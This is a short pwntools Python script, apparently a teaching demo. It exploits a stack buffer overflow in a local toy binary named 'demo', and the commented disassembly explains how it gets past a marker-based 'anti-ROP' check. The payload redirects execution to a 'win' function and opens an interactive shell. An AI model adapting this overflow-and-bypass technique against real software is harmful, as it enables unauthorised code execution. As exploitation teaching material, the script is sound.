#!/usr/bin/env python2
###
# This script requires pwntools, which can be installed via
# 'pip install -U pwntools'
#
# Alternately, you can 'docker pull pwntools/pwntools:stable'
#
# More information is available at pwntools.com
###
from pwn import *

context.binary = demo = ELF('demo')

# The entirety of main() is:
#
# .text:004004E0 main            proc near
# .text:004004E0                 sub     rsp, 48h
# .text:004004E4                 xor     edi, edi ; fd
# .text:004004E6                 mov     edx, 200h ; nbytes
# .text:004004EB                 mov     rsi, rsp ; buf
# .text:004004EE                 call    _read
# .text:004004EE ; ---------------------------------------------------------------------------
# .text:004004F3                 dd 0CAFE02EBh
# .text:004004F7 ; ---------------------------------------------------------------------------
# .text:004004F7                 mov     rax, [rsp+48h]
# .text:004004FC                 cmp     dword ptr [rax], 0CAFE02EBh
# .text:00400502                 jz      short loc_40050F
# .text:00400504                 xor     eax, eax
# .text:00400506                 call    ___stack_chk_fail
# .text:00400506 ; ---------------------------------------------------------------------------
# .text:0040050B                 dd 0CAFE02EBh
# .text:0040050F ; ---------------------------------------------------------------------------
# .text:0040050F
# .text:0040050F loc_40050F:
# .text:0040050F                 xor     eax, eax
# .text:00400511                 add     rsp, 48h
# .text:00400515                 retn
#
# So our target is after the call to __stack_chk_fail
#
# Conveniently, it's the last instance of 0xCAFE02EB in the binary
target = list(demo.search(p32(0xcafe02eb)))[-1]

log.info("%#x" % target)

# The offset to the return address on the stack is 0x48
#
#     sub     rsp, 48h
#     ...
#     mov     rsi, rsp ; buf
#     ...
#     call    _read
#
offset = 0x48

# Let's generate a payload which gets us past the "anti-ROP protection"
#
# fit() is a helper function which generates padding and up to various
# offsets and automatically byte-packs values.
#
# When executing our bypass, we will re-execute "add rsp, 48h; ret"
# and then begin our "real" ROP stack.
#
# Since the intent is not to demonstrate how ROP works, just that
# we have **arbitrary** ROP execution, we jump to a convenient function.

payload = fit({
    offset: target,
    offset + 8 + 0x48: demo.symbols.win
})

log.hexdump(payload)

# Let's run it and see what happens
p = process('./demo')
p.send(payload)

# Have a shell!
log.success("Have a shell!")
p.interactive()
